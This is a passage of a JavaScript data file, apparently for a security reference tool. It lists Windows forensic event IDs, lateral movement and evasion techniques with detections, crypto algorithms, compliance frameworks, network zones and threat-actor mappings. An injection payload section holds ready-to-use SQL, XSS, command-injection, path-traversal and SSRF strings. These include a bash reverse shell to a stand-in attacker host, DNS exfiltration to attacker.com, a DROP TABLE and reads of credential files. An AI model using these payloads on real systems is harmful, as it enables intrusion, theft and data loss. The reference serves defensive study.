  { eid: 1102, source: 'Security', name: 'Audit Log Cleared', desc: 'The audit log was cleared', forensic: 'Critical', usage: 'Anti-forensics detection - attackers clearing tracks' },
  { eid: 4624, source: 'Security', name: 'Successful Logon', desc: 'An account was successfully logged on', forensic: 'Critical', usage: 'Track all authentications, LogonType reveals method (3=network, 10=RDP)' },
  { eid: 4625, source: 'Security', name: 'Failed Logon', desc: 'An account failed to log on', forensic: 'High', usage: 'Detect brute force, password spraying, credential stuffing' },
  { eid: 4634, source: 'Security', name: 'Logoff', desc: 'An account was logged off', forensic: 'Low', usage: 'Session duration tracking, correlation with 4624' },
  { eid: 4648, source: 'Security', name: 'Explicit Credentials', desc: 'A logon was attempted using explicit credentials', forensic: 'High', usage: 'Detect runas, PsExec, lateral movement with alternate credentials' },
  { eid: 4662, source: 'Security', name: 'Object Operation', desc: 'An operation was performed on an AD object', forensic: 'Critical', usage: 'Detect DCSync (Replicating Directory Changes permission use)' },
  { eid: 4672, source: 'Security', name: 'Special Privileges', desc: 'Special privileges assigned to new logon', forensic: 'High', usage: 'Track admin-level logons (SeDebugPrivilege, SeBackupPrivilege)' },
  { eid: 4688, source: 'Security', name: 'Process Creation', desc: 'A new process has been created', forensic: 'High', usage: 'Alternative to Sysmon EID 1 if Sysmon not deployed' },
  { eid: 4697, source: 'Security', name: 'Service Installed', desc: 'A service was installed in the system', forensic: 'Critical', usage: 'Detect malicious service installation (persistence/execution)' },
  { eid: 4698, source: 'Security', name: 'Scheduled Task Created', desc: 'A scheduled task was created', forensic: 'Critical', usage: 'Detect persistence and execution via Task Scheduler' },
  { eid: 4720, source: 'Security', name: 'User Account Created', desc: 'A user account was created', forensic: 'High', usage: 'Detect attacker creating backdoor accounts' },
  { eid: 4728, source: 'Security', name: 'Member Added to Security Group', desc: 'A member was added to a security-enabled global group', forensic: 'Critical', usage: 'Detect privilege escalation via group membership changes' },
  { eid: 4732, source: 'Security', name: 'Member Added to Local Group', desc: 'A member was added to a security-enabled local group', forensic: 'Critical', usage: 'Detect local admin group manipulation' },
  { eid: 4740, source: 'Security', name: 'Account Locked Out', desc: 'A user account was locked out', forensic: 'Medium', usage: 'Brute force detection, may indicate compromise attempt' },
  { eid: 4769, source: 'Security', name: 'Kerberos Service Ticket', desc: 'A Kerberos service ticket was requested', forensic: 'High', usage: 'Detect Kerberoasting (RC4 encryption type 0x17)' },
  { eid: 4771, source: 'Security', name: 'Kerberos Pre-Auth Failed', desc: 'Kerberos pre-authentication failed', forensic: 'Medium', usage: 'Detect AS-REP roasting attempts, password guessing' },
  { eid: 4776, source: 'Security', name: 'NTLM Authentication', desc: 'The DC attempted to validate credentials', forensic: 'High', usage: 'Track NTLM authentication - should be minimal in modern AD' },
  { eid: 5136, source: 'Security', name: 'Directory Service Object Modified', desc: 'An AD DS object was modified', forensic: 'Critical', usage: 'Detect AD attribute modification (msDS-KeyCredentialLink, AdminSDHolder)' },
  { eid: 5140, source: 'Security', name: 'Network Share Access', desc: 'A network share object was accessed', forensic: 'High', usage: 'Detect lateral movement via SMB shares (ADMIN$, C$, IPC$)' },
  { eid: 5145, source: 'Security', name: 'Network Share Object Checked', desc: 'Shared object access check with detailed access', forensic: 'High', usage: 'Detailed file share access with access mask - ransomware detection' },
  { eid: 7045, source: 'System', name: 'New Service Installed', desc: 'A service was installed in the system', forensic: 'Critical', usage: 'Detect PsExec (PSEXESVC), malicious services, persistence' },
  { eid: 4104, source: 'PowerShell', name: 'Script Block Logging', desc: 'PowerShell script block was logged', forensic: 'Critical', usage: 'Capture full PowerShell script content including decoded/deobfuscated' },
  { eid: 4103, source: 'PowerShell', name: 'Module Logging', desc: 'PowerShell module loaded', forensic: 'High', usage: 'Track PowerShell module usage and pipeline execution' },
];

// ============================================================================
// LATERAL MOVEMENT TECHNIQUES REFERENCE
// ============================================================================
const LATERAL_MOVEMENT_TECHNIQUES = [
  { name: 'PsExec', tool: 'Sysinternals PsExec / Impacket', protocol: 'SMB (445)', detection: 'Service creation (7045, PSEXESVC), process creation from services.exe', stealth: 'Low', notes: 'Creates a service on target. Very noisy. Default service name: PSEXESVC.' },
  { name: 'WMI', tool: 'wmic, Impacket wmiexec', protocol: 'WMI/DCOM (135, ephemeral)', detection: 'Process creation from WmiPrvSE.exe, WMI activity logging', stealth: 'Medium', notes: 'No service creation. Process spawns from WmiPrvSE.exe parent.' },
  { name: 'WinRM', tool: 'Enter-PSSession, evil-winrm', protocol: 'HTTP/S (5985/5986)', detection: 'WinRM connection logs, PowerShell remoting events', stealth: 'Medium', notes: 'Uses PowerShell Remoting. Encrypted if using HTTPS.' },
  { name: 'SMB Admin Shares', tool: 'net use, copy', protocol: 'SMB (445)', detection: 'Share access events (5140, 5145), file creation on remote hosts', stealth: 'Low', notes: 'Uses ADMIN$ or C$ shares. Requires local admin on target.' },
  { name: 'RDP', tool: 'mstsc.exe, rdesktop, xfreerdp', protocol: 'RDP (3389)', detection: 'Logon events (4624 type 10), session events, RDP bitmap cache', stealth: 'Low', notes: 'Interactive GUI access. Creates forensic artifacts. SharpRDP for restricted RDP.' },
  { name: 'SSH', tool: 'ssh, PuTTY', protocol: 'SSH (22)', detection: 'SSH auth logs, key-based auth monitoring', stealth: 'Medium', notes: 'Primary lateral movement on Linux/Unix. Check authorized_keys for persistence.' },
  { name: 'DCOM', tool: 'Impacket dcomexec, PowerShell', protocol: 'DCOM (135, ephemeral)', detection: 'Process from mmc.exe/excel.exe, DCOM activity logs', stealth: 'Medium', notes: 'Uses various DCOM objects (ShellBrowserWindow, MMC20.Application, Excel.Application).' },
  { name: 'Pass-the-Hash', tool: 'Mimikatz, pth-winexe, Impacket', protocol: 'NTLM (various)', detection: 'LogonType 9 (NewCredentials), NTLM from unexpected sources', stealth: 'Medium', notes: 'Uses NTLM hash directly. Works against any NTLM-accepting service.' },
  { name: 'Pass-the-Ticket', tool: 'Mimikatz, Rubeus', protocol: 'Kerberos (88)', detection: 'Ticket reuse from different IPs, anomalous Kerberos patterns', stealth: 'High', notes: 'Injects Kerberos ticket. More stealthy than PtH. No NTLM fallback artifacts.' },
  { name: 'Over-Pass-the-Hash', tool: 'Mimikatz, Rubeus', protocol: 'Kerberos (88)', detection: 'RC4 Kerberos auth from workstation (should be AES)', stealth: 'High', notes: 'Uses NTLM hash to request Kerberos ticket. Avoids NTLM-based detections.' },
  { name: 'Scheduled Task (Remote)', tool: 'schtasks /s', protocol: 'RPC (135)', detection: 'Task creation events (4698), process from taskeng.exe/taskhostw.exe', stealth: 'Medium', notes: 'Create task on remote host. Can be one-time or recurring. Less noisy than PsExec.' },
  { name: 'SC (Service Control)', tool: 'sc.exe \\\\target', protocol: 'SMB/RPC (445)', detection: 'Service creation (7045), binary path modification', stealth: 'Low', notes: 'Create/modify service on remote host. Requires admin. Very detectable.' },
  { name: 'PowerShell Remoting', tool: 'Invoke-Command, Enter-PSSession', protocol: 'WinRM (5985/5986)', detection: 'WinRM events, PowerShell logging (4104)', stealth: 'Medium', notes: 'Native PowerShell feature. Can run scriptblocks remotely.' },
  { name: 'RDP Hijacking', tool: 'tscon.exe', protocol: 'RDP (local)', detection: 'Session switch events, tscon.exe execution', stealth: 'Medium', notes: 'Hijack existing RDP session without password. Requires SYSTEM privileges.' },
  { name: 'SSH Key Injection', tool: 'ssh-keygen, echo >> authorized_keys', protocol: 'SSH (22)', detection: 'authorized_keys file modification, new SSH auth from unknown key', stealth: 'High', notes: 'Add attacker SSH public key for passwordless persistent access.' },
];

// ============================================================================
// ENCRYPTION ALGORITHMS REFERENCE
// ============================================================================
const CRYPTO_ALGORITHMS = [
  { name: 'AES-128', type: 'Symmetric', keySize: 128, blockSize: 128, status: 'Secure', speed: 'Fast', usage: 'General encryption, disk encryption, VPN, TLS' },
  { name: 'AES-256', type: 'Symmetric', keySize: 256, blockSize: 128, status: 'Secure', speed: 'Fast', usage: 'Classified information, high-security applications' },
  { name: 'ChaCha20-Poly1305', type: 'AEAD', keySize: 256, blockSize: 'Stream', status: 'Secure', speed: 'Very Fast', usage: 'TLS 1.3, WireGuard VPN, mobile (no AES-NI)' },
  { name: 'RSA-2048', type: 'Asymmetric', keySize: 2048, blockSize: 'N/A', status: 'Secure (until ~2030)', speed: 'Slow', usage: 'Key exchange, digital signatures, certificate signing' },
  { name: 'RSA-4096', type: 'Asymmetric', keySize: 4096, blockSize: 'N/A', status: 'Secure', speed: 'Very Slow', usage: 'High-security key exchange, long-term certificates' },
  { name: 'ECDSA P-256', type: 'Asymmetric', keySize: 256, blockSize: 'N/A', status: 'Secure', speed: 'Fast', usage: 'Digital signatures, TLS certificates, SSH keys' },
  { name: 'Ed25519', type: 'Asymmetric', keySize: 256, blockSize: 'N/A', status: 'Secure', speed: 'Very Fast', usage: 'SSH keys, code signing, modern digital signatures' },
  { name: 'X25519', type: 'Key Exchange', keySize: 256, blockSize: 'N/A', status: 'Secure', speed: 'Very Fast', usage: 'Diffie-Hellman key exchange in TLS 1.3, WireGuard' },
  { name: 'SHA-256', type: 'Hash', keySize: 'N/A', blockSize: 512, status: 'Secure', speed: 'Fast', usage: 'File integrity, digital signatures, password hashing (with KDF)' },
  { name: 'SHA-512', type: 'Hash', keySize: 'N/A', blockSize: 1024, status: 'Secure', speed: 'Fast', usage: 'Linux password hashing, certificate fingerprints' },
  { name: 'SHA-3 (Keccak)', type: 'Hash', keySize: 'N/A', blockSize: 1600, status: 'Secure', speed: 'Medium', usage: 'Alternative to SHA-2, post-quantum considerations' },
  { name: 'BLAKE2b', type: 'Hash', keySize: 'N/A', blockSize: 1024, status: 'Secure', speed: 'Very Fast', usage: 'File hashing, integrity checking, password hashing (Argon2 uses it)' },
  { name: 'bcrypt', type: 'KDF', keySize: 'Variable', blockSize: 'N/A', status: 'Secure', speed: 'Intentionally Slow', usage: 'Password hashing with configurable work factor' },
  { name: 'Argon2id', type: 'KDF', keySize: 'Variable', blockSize: 'N/A', status: 'Best Practice', speed: 'Intentionally Slow', usage: 'Modern password hashing - memory-hard, GPU-resistant' },
  { name: 'scrypt', type: 'KDF', keySize: 'Variable', blockSize: 'N/A', status: 'Secure', speed: 'Intentionally Slow', usage: 'Password hashing - memory-hard, used by many cryptocurrency systems' },
  { name: 'PBKDF2', type: 'KDF', keySize: 'Variable', blockSize: 'N/A', status: 'Adequate', speed: 'Configurable', usage: 'Password hashing with iteration count. Use 600K+ iterations with SHA-256.' },
  { name: 'DES', type: 'Symmetric', keySize: 56, blockSize: 64, status: 'BROKEN', speed: 'Fast', usage: 'NEVER use. Brute-forceable in hours. Legacy systems only.' },
  { name: '3DES', type: 'Symmetric', keySize: 168, blockSize: 64, status: 'Deprecated', speed: 'Slow', usage: 'Legacy compatibility only. Sweet32 attack on 64-bit block size.' },
  { name: 'RC4', type: 'Stream', keySize: 'Variable', blockSize: 'Stream', status: 'BROKEN', speed: 'Fast', usage: 'NEVER use. Multiple known biases. Banned from TLS.' },
  { name: 'MD5', type: 'Hash', keySize: 'N/A', blockSize: 512, status: 'BROKEN', speed: 'Very Fast', usage: 'NEVER for security. Collision attacks practical. File checksums only.' },
  { name: 'SHA-1', type: 'Hash', keySize: 'N/A', blockSize: 512, status: 'BROKEN', speed: 'Fast', usage: 'Deprecated. Collision attacks demonstrated. Use SHA-256+.' },
];


// ============================================================================
// COMMON PAYLOADS AND EVASION TECHNIQUES
// ============================================================================
const PAYLOAD_TECHNIQUES = [
  { name: 'Process Hollowing', mitre: 'T1055.012', desc: 'Create process in suspended state, hollow out legitimate code, inject malicious code, resume', evasion: 'Appears as legitimate process in task manager', detection: 'Sysmon EID 25 (ProcessTampering), memory forensics, hollowed process without expected DLLs', difficulty: 'Medium' },
  { name: 'Process Ghosting', mitre: 'T1055', desc: 'Create file, mark for deletion, map to section, delete file, create process from section', evasion: 'File deleted before process starts - no on-disk artifact', detection: 'Sysmon EID 25, process without backing file on disk', difficulty: 'High' },
  { name: 'Process Herpaderping', mitre: 'T1055', desc: 'Create file, map section, modify file content, create process from original section', evasion: 'On-disk file differs from in-memory image - confuses AV scanning', detection: 'Sysmon EID 25, hash mismatch between file and loaded image', difficulty: 'High' },
  { name: 'DLL Side-Loading', mitre: 'T1574.002', desc: 'Place malicious DLL where legitimate app searches before system directories', evasion: 'Legitimate signed application loads attacker DLL', detection: 'Sysmon EID 7 with unusual DLL paths, unsigned DLL loaded by signed app', difficulty: 'Low' },
  { name: 'Reflective DLL Injection', mitre: 'T1055.001', desc: 'Load DLL from memory without touching disk, using custom loader', evasion: 'No file on disk, no LoadLibrary API call in logs', detection: 'Memory scanning, API hooking detection, unbacked memory regions with execute', difficulty: 'High' },
  { name: 'Syscall Direct Invocation', mitre: 'T1106', desc: 'Call NT syscalls directly instead of through ntdll.dll to bypass EDR hooks', evasion: 'Bypasses userland API hooks placed by EDR/AV products', detection: 'Stack trace analysis, syscall instruction not originating from ntdll.dll', difficulty: 'High' },
  { name: 'NTDLL Unhooking', mitre: 'T1562.001', desc: 'Reload clean copy of ntdll.dll from disk to remove EDR hooks', evasion: 'Removes all EDR monitoring hooks from the process', detection: 'ntdll.dll section remapping detection, hash verification of loaded ntdll', difficulty: 'Medium' },
  { name: 'Parent PID Spoofing', mitre: 'T1134.004', desc: 'Create process with spoofed PPID to masquerade origin', evasion: 'Process appears to be spawned by a different (legitimate) parent', detection: 'Process creation with unexpected parent, ETW tracing', difficulty: 'Medium' },
  { name: 'Fiber Local Storage Callback', mitre: 'T1055', desc: 'Abuse fiber local storage callbacks for code execution', evasion: 'Unconventional execution method, not well monitored', detection: 'Fiber-related API calls from unexpected processes', difficulty: 'High' },
  { name: 'APC Injection', mitre: 'T1055.004', desc: 'Queue Asynchronous Procedure Call to target thread for code execution', evasion: 'Uses legitimate Windows mechanism for cross-process execution', detection: 'QueueUserAPC API monitoring, alertable thread state tracking', difficulty: 'Medium' },
  { name: 'Thread Execution Hijacking', mitre: 'T1055.003', desc: 'Suspend target thread, modify context (EIP/RIP), resume with shellcode', evasion: 'Executes in context of existing thread, no new thread creation', detection: 'SuspendThread + SetThreadContext + ResumeThread API sequence', difficulty: 'Medium' },
  { name: 'Module Stomping', mitre: 'T1055.001', desc: 'Load legitimate DLL, then overwrite its .text section with shellcode', evasion: 'Shellcode runs from legitimately loaded module address space', detection: 'Memory section hash verification, unbacked code execution', difficulty: 'High' },
  { name: 'AMSI Bypass', mitre: 'T1562.001', desc: 'Patch AmsiScanBuffer to return clean result for all scans', evasion: 'Disables PowerShell/VBScript/JScript malware scanning', detection: 'AMSI bypass strings in script block logging, AMSI provider failure events', difficulty: 'Low' },
  { name: 'ETW Patching', mitre: 'T1562.001', desc: 'Patch Event Tracing for Windows to prevent telemetry collection', evasion: 'Blinds EDR and monitoring tools that rely on ETW data', detection: 'ETW provider status monitoring, NtTraceControl hook detection', difficulty: 'Medium' },
  { name: 'PPL Bypass', mitre: 'T1562', desc: 'Bypass Protected Process Light to access LSASS memory', evasion: 'Accesses credential-containing processes despite OS protections', detection: 'PPL driver load events, kernel-level credential access monitoring', difficulty: 'High' },
];

// ============================================================================
// COMMAND INJECTION PAYLOADS REFERENCE
// ============================================================================
const INJECTION_PAYLOADS = {
  sql: [
    { name: 'Union-Based SQLi', payload: "' UNION SELECT 1,2,3,user(),version()--", desc: 'Extract database user and version via UNION', context: 'MySQL' },
    { name: 'Boolean Blind SQLi', payload: "' AND 1=1--", desc: 'True condition for blind enumeration', context: 'Generic' },
    { name: 'Time Blind SQLi', payload: "' AND SLEEP(5)--", desc: 'Time-based blind SQLi (MySQL)', context: 'MySQL' },
    { name: 'MSSQL xp_cmdshell', payload: "'; EXEC xp_cmdshell 'whoami';--", desc: 'OS command execution via SQL Server', context: 'MSSQL' },
    { name: 'Error-Based SQLi', payload: "' AND extractvalue(1,concat(0x7e,version()))--", desc: 'Extract data via XML error messages', context: 'MySQL' },
    { name: 'Stacked Queries', payload: "'; DROP TABLE users;--", desc: 'Execute secondary query (destructive example)', context: 'MSSQL/PostgreSQL' },
    { name: 'Out-of-Band SQLi', payload: "' AND (SELECT load_file(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\a')))--", desc: 'Exfiltrate data via DNS/HTTP', context: 'MySQL' },
    { name: 'PostgreSQL RCE', payload: "'; COPY cmd_output FROM PROGRAM 'id';--", desc: 'Execute OS command in PostgreSQL', context: 'PostgreSQL' },
  ],
  xss: [
    { name: 'Basic Reflected XSS', payload: '<script>alert(document.cookie)</script>', desc: 'Simple script injection', context: 'HTML body' },
    { name: 'Event Handler XSS', payload: '<img src=x onerror=alert(1)>', desc: 'XSS via HTML event handler', context: 'HTML body' },
    { name: 'SVG XSS', payload: '<svg onload=alert(1)>', desc: 'XSS via SVG element', context: 'HTML body' },
    { name: 'JavaScript URI', payload: 'javascript:alert(document.domain)', desc: 'XSS via JavaScript protocol', context: 'href attribute' },
    { name: 'DOM XSS Source', payload: '#<img src=x onerror=alert(1)>', desc: 'DOM-based XSS via URL fragment', context: 'URL fragment' },
    { name: 'Template Injection', payload: '{{7*7}}', desc: 'Server-Side Template Injection test', context: 'Template engine' },
    { name: 'Polyglot XSS', payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e", desc: 'XSS polyglot that works in multiple contexts', context: 'Universal' },
  ],
  command: [
    { name: 'Basic Command Injection', payload: '; ls -la', desc: 'Semicolon command separator', context: 'Linux' },
    { name: 'Pipe Injection', payload: '| cat /etc/passwd', desc: 'Pipe output to read sensitive file', context: 'Linux' },
    { name: 'Backtick Injection', payload: '`whoami`', desc: 'Command substitution via backticks', context: 'Linux' },
    { name: 'Dollar Injection', payload: '$(id)', desc: 'Command substitution via $() syntax', context: 'Linux' },
    { name: 'Windows Command', payload: '& dir C:\\', desc: 'Ampersand command chaining on Windows', context: 'Windows' },
    { name: 'Newline Injection', payload: '%0aid', desc: 'Newline character for command injection', context: 'Linux/Windows' },
    { name: 'Reverse Shell', payload: ';bash -i >& /dev/tcp/ATTACKER/4444 0>&1', desc: 'Bash reverse shell via command injection', context: 'Linux' },
  ],
  path_traversal: [
    { name: 'Basic Traversal', payload: '../../../etc/passwd', desc: 'Navigate up directories to read /etc/passwd', context: 'Linux' },
    { name: 'URL Encoded', payload: '..%2f..%2f..%2fetc%2fpasswd', desc: 'URL-encoded directory traversal', context: 'Web' },
    { name: 'Double Encoded', payload: '..%252f..%252f..%252fetc%252fpasswd', desc: 'Double URL-encoded traversal', context: 'Web (with normalization)' },
    { name: 'Null Byte', payload: '../../../etc/passwd%00.jpg', desc: 'Null byte to bypass extension checks', context: 'PHP < 5.3' },
    { name: 'Windows Traversal', payload: '..\\..\\..\\windows\\system32\\config\\sam', desc: 'Windows path traversal using backslashes', context: 'Windows' },
    { name: 'UNC Path', payload: '\\\\attacker\\share\\payload', desc: 'UNC path for NTLM hash capture', context: 'Windows' },
  ],
  ssrf: [
    { name: 'AWS Metadata', payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', desc: 'Access AWS EC2 instance metadata for credentials', context: 'AWS' },
    { name: 'GCP Metadata', payload: 'http://metadata.google.internal/computeMetadata/v1/', desc: 'Access GCP instance metadata (requires Metadata-Flavor header)', context: 'GCP' },
    { name: 'Azure Metadata', payload: 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01', desc: 'Access Azure IMDS for managed identity token', context: 'Azure' },
    { name: 'Internal Port Scan', payload: 'http://127.0.0.1:PORT/', desc: 'Scan internal services via SSRF', context: 'Any' },
    { name: 'File Read', payload: 'file:///etc/passwd', desc: 'Read local files via file:// protocol', context: 'Any' },
    { name: 'DNS Rebinding', payload: 'http://attacker-controlled-domain/', desc: 'DNS rebinding to bypass IP restrictions', context: 'Any' },
  ],
};

// ============================================================================
// COMPLIANCE FRAMEWORK REFERENCE
// ============================================================================
const COMPLIANCE_FRAMEWORKS = [
  { name: 'NIST CSF 2.0', full: 'NIST Cybersecurity Framework', category: 'Framework', scope: 'Any organization', requirements: 'Identify, Protect, Detect, Respond, Recover, Govern', mandatory: false, penalty: 'N/A (voluntary)', notes: 'Gold standard cybersecurity framework. Functions, categories, subcategories.' },
  { name: 'NIST 800-53', full: 'Security and Privacy Controls', category: 'Controls', scope: 'US Federal systems', requirements: '1000+ security controls across 20 families', mandatory: true, penalty: 'Loss of ATO', notes: 'Required for FISMA compliance. Rev 5 adds privacy controls.' },
  { name: 'ISO 27001', full: 'Information Security Management', category: 'Standard', scope: 'Any organization', requirements: 'ISMS implementation, Annex A controls, continuous improvement', mandatory: false, penalty: 'Loss of certification', notes: 'International standard. Certifiable. 93 controls in Annex A (2022 revision).' },
  { name: 'SOC 2', full: 'Service Organization Controls', category: 'Audit', scope: 'Service providers', requirements: 'Trust Services Criteria: Security, Availability, Processing Integrity, Confidentiality, Privacy', mandatory: false, penalty: 'Customer trust/contracts', notes: 'Type I (point-in-time) vs Type II (period of time). Critical for SaaS vendors.' },
  { name: 'PCI DSS 4.0', full: 'Payment Card Industry Data Security Standard', category: 'Standard', scope: 'Card payment processors', requirements: '12 requirements, 300+ sub-requirements covering network, data, access, monitoring', mandatory: true, penalty: 'Fines $5K-100K/month, loss of processing', notes: 'v4.0 effective March 2025. Customized approach allowed.' },
  { name: 'HIPAA', full: 'Health Insurance Portability and Accountability Act', category: 'Regulation', scope: 'Healthcare (US)', requirements: 'Privacy Rule, Security Rule, Breach Notification Rule', mandatory: true, penalty: '$100-$50K per violation, max $1.5M/year per category', notes: 'Protects PHI. 60-day breach notification. HITECH Act strengthened enforcement.' },
  { name: 'GDPR', full: 'General Data Protection Regulation', category: 'Regulation', scope: 'EU residents data', requirements: 'Data protection, consent, breach notification (72hr), DPO, DPIA, data portability', mandatory: true, penalty: 'Up to 4% annual global revenue or 20M EUR', notes: 'Applies to any org processing EU resident data. Right to erasure, data portability.' },
  { name: 'CCPA/CPRA', full: 'California Consumer Privacy Act / California Privacy Rights Act', category: 'Regulation', scope: 'California residents', requirements: 'Consumer rights: know, delete, opt-out, non-discrimination, correct, limit', mandatory: true, penalty: '$2,500 per violation, $7,500 per intentional violation', notes: 'CPRA (2023) added California Privacy Protection Agency, expanded rights.' },
  { name: 'CIS Controls v8', full: 'Center for Internet Security Controls', category: 'Controls', scope: 'Any organization', requirements: '18 control families, 153 safeguards across 3 implementation groups', mandatory: false, penalty: 'N/A (voluntary)', notes: 'Prioritized, prescriptive guidance. IG1 (essential), IG2, IG3 for different maturity.' },
  { name: 'MITRE ATT&CK', full: 'Adversarial Tactics, Techniques, and Common Knowledge', category: 'Framework', scope: 'Threat modeling/detection', requirements: '14 tactics, 200+ techniques, 400+ sub-techniques', mandatory: false, penalty: 'N/A (knowledge base)', notes: 'Maps real-world adversary behavior. Used for detection engineering, threat hunting, red teaming.' },
  { name: 'FedRAMP', full: 'Federal Risk and Authorization Management Program', category: 'Authorization', scope: 'Cloud services for US Gov', requirements: 'NIST 800-53 controls at Low/Moderate/High baseline', mandatory: true, penalty: 'Cannot serve US Government', notes: 'Required for cloud services selling to US federal agencies. 3PAO assessment required.' },
  { name: 'CMMC 2.0', full: 'Cybersecurity Maturity Model Certification', category: 'Certification', scope: 'US DoD contractors', requirements: 'Level 1 (basic), Level 2 (NIST 800-171), Level 3 (800-172)', mandatory: true, penalty: 'Cannot bid on DoD contracts', notes: 'Phased rollout. Level 2 required for CUI handling. Third-party assessments (C3PAO).' },
];


// ============================================================================
// NETWORK SECURITY ZONES REFERENCE
// ============================================================================
const NETWORK_ZONES = [
  { zone: 'DMZ', purpose: 'Demilitarized Zone - public-facing services', assets: ['Web servers','Email gateways','DNS servers','Reverse proxies','WAF'], firewallPolicy: 'Allow: Internet -> DMZ (specific ports), DMZ -> Internal (specific only), Deny: DMZ -> Internal (default)', risks: ['Web application vulnerabilities','DDoS exposure','Lateral movement to internal'], bestPractices: ['No direct DMZ-to-internal access','Separate management network','WAF in front of web apps','Regular vulnerability scanning'] },
  { zone: 'Internal/Corporate', purpose: 'End-user workstations and general IT', assets: ['Workstations','Printers','VOIP phones','Corporate applications','File servers'], firewallPolicy: 'Allow: Internal -> Internet (via proxy), Internal -> DMZ (limited), Deny: Internet -> Internal', risks: ['Phishing compromise','Insider threats','Lateral movement','Data exfiltration'], bestPractices: ['Network segmentation by department','NAC enforcement','Endpoint protection','DLP monitoring','Proxy all internet access'] },
  { zone: 'Server/Data Center', purpose: 'Critical servers and databases', assets: ['Domain Controllers','Database servers','Application servers','Backup infrastructure','Monitoring systems'], firewallPolicy: 'Allow: Internal -> Server (application ports only), Server -> Server (specific flows), Deny: Internet -> Server', risks: ['Credential theft (DCSync, Kerberoasting)','Database compromise','Ransomware encryption','Data exfiltration'], bestPractices: ['Micro-segmentation','PAM for admin access','Database activity monitoring','Encrypted backups in separate zone'] },
  { zone: 'Management', purpose: 'Network device and server management', assets: ['Jump servers/PAWs','Network management systems','IPMI/iDRAC/iLO','Configuration management','Monitoring dashboards'], firewallPolicy: 'Allow: Management -> All Zones (management ports), PAW -> Management, Deny: All -> Management (except PAW)', risks: ['Management plane compromise','IPMI/BMC vulnerabilities','Credential theft for admin accounts'], bestPractices: ['Dedicated management VLAN','Privileged Access Workstations (PAWs)','MFA for all management access','Separate credentials from production'] },
  { zone: 'Guest/BYOD', purpose: 'Visitor and personal device access', assets: ['Guest WiFi','Captive portal','Internet-only access'], firewallPolicy: 'Allow: Guest -> Internet only, Deny: Guest -> All Internal Zones', risks: ['Rogue device access','WiFi attacks','MITM on shared network'], bestPractices: ['Complete isolation from corporate network','Captive portal with ToS','Rate limiting','Content filtering','No DNS to internal'] },
  { zone: 'IoT/OT', purpose: 'Internet of Things and Operational Technology', assets: ['SCADA/ICS systems','Building automation','Security cameras','Smart devices','Medical devices'], firewallPolicy: 'Allow: IoT -> Specific cloud endpoints, IoT -> Management (monitoring only), Deny: IoT -> Corporate/Server', risks: ['Unpatched firmware','Default credentials','Protocol vulnerabilities (Modbus, BACnet)','Physical safety impact'], bestPractices: ['Complete network isolation','No internet access unless required','Asset inventory','Firmware update management','Purdue model for ICS'] },
  { zone: 'Development/Test', purpose: 'Software development and testing environments', assets: ['CI/CD pipelines','Test databases','Staging servers','Container registries','Developer workstations'], firewallPolicy: 'Allow: Dev -> Internet (controlled), Dev -> Dev, Deny: Dev -> Production (except deployment pipeline)', risks: ['Secrets in code/config','Unpatched test systems','Data in test databases','Supply chain attacks via CI/CD'], bestPractices: ['No production data in test (use anonymized data)','Separate credentials from production','Scan code for secrets','Secure CI/CD pipeline','Container image scanning'] },
  { zone: 'Cloud VPC', purpose: 'Cloud-hosted workloads', assets: ['Cloud VMs','Containers','Serverless functions','Cloud databases','Object storage'], firewallPolicy: 'Security Groups / NSGs per resource, Default deny, Allow only required flows', risks: ['Misconfigured security groups','Public S3/Blob exposure','IAM over-privilege','SSRF to metadata service'], bestPractices: ['Infrastructure as Code for consistency','Cloud Security Posture Management (CSPM)','VPC Flow Logs enabled','Private endpoints for PaaS services','IMDSv2 enforcement'] },
];

// ============================================================================
// INCIDENT SEVERITY CLASSIFICATION MATRIX
// ============================================================================
const SEVERITY_MATRIX = [
  { level: 'P1 - Critical', responseTime: '15 minutes', escalation: 'Immediate', criteria: ['Active data exfiltration in progress','Ransomware executing across network','Critical infrastructure compromised','Domain Controller compromised','Active APT intrusion confirmed','Mass credential compromise','Customer PII actively being stolen'], commander: 'CISO/VP Security', team: 'Full IR team + Legal + Exec', communication: 'Every 30 minutes', sla: 'Containment within 1 hour' },
  { level: 'P2 - High', responseTime: '1 hour', escalation: 'Within 30 minutes', criteria: ['Single system compromised with lateral movement potential','Phishing campaign with confirmed credential theft','Unauthorized access to sensitive data','Malware infection on server','VPN/remote access compromise','Insider threat with data access'], commander: 'Security Manager', team: 'IR team + affected system owners', communication: 'Every 2 hours', sla: 'Containment within 4 hours' },
  { level: 'P3 - Medium', responseTime: '4 hours', escalation: 'Within 2 hours', criteria: ['Single endpoint malware infection','Brute force attack detected and blocked','Phishing email reported (no compromise confirmed)','Unauthorized software installation','Policy violation with security impact','Vulnerability actively being scanned'], commander: 'SOC Lead', team: 'SOC analysts + endpoint team', communication: 'Every 8 hours', sla: 'Resolution within 24 hours' },
  { level: 'P4 - Low', responseTime: 'Next business day', escalation: 'Within 24 hours', criteria: ['Informational security alerts','Policy violations without security impact','Failed attack attempts (blocked by controls)','Routine vulnerability findings','Security tool misconfiguration','User security awareness issues'], commander: 'SOC Analyst', team: 'SOC analyst', communication: 'Daily summary', sla: 'Resolution within 72 hours' },
];

// ============================================================================
// THREAT ACTOR TTP MAPPING TO MITRE
// ============================================================================
const TTP_MAPPING = [
  { actor: 'APT28', tactic: 'Initial Access', techniques: ['T1566.001 - Spearphishing Attachment','T1566.002 - Spearphishing Link','T1190 - Exploit Public-Facing Application'] },
  { actor: 'APT28', tactic: 'Execution', techniques: ['T1059.001 - PowerShell','T1059.003 - Windows Command Shell','T1059.005 - Visual Basic'] },
  { actor: 'APT28', tactic: 'Persistence', techniques: ['T1547.001 - Registry Run Keys','T1053.005 - Scheduled Task','T1505.003 - Web Shell'] },
  { actor: 'APT28', tactic: 'Credential Access', techniques: ['T1003.001 - LSASS Memory','T1003.003 - NTDS','T1558.003 - Kerberoasting'] },
  { actor: 'APT29', tactic: 'Initial Access', techniques: ['T1195.002 - Supply Chain (SolarWinds)','T1566.001 - Spearphishing','T1078 - Valid Accounts'] },
  { actor: 'APT29', tactic: 'Defense Evasion', techniques: ['T1027 - Obfuscated Files','T1036 - Masquerading','T1070 - Indicator Removal'] },
